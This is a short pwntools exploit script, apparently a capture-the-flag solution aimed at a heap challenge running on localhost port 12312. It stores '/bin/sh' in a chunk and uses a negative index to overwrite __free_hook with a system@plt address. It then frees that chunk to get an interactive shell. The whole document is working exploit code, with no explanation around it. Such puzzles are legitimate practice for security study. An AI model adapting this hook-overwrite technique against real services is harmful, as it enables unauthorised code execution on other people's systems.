from pwn import *

r = remote("localhost", 12312)

# special chunk
r.recvuntil(">")
r.sendline('1')
r.sendline('3')
r.recvuntil('Destination')
r.sendline('/bin/sh')

# overwrite __free_hook with (system@plt+6)
r.recvuntil(">")
r.sendline('2')
r.sendline(str( -262194 ))
r.recvuntil('trip:')
r.send(p64(0x400716))

# free something
r.recvuntil(">")
r.sendline('3')
r.recvuntil("delete:")
r.sendline('0')

r.interactive()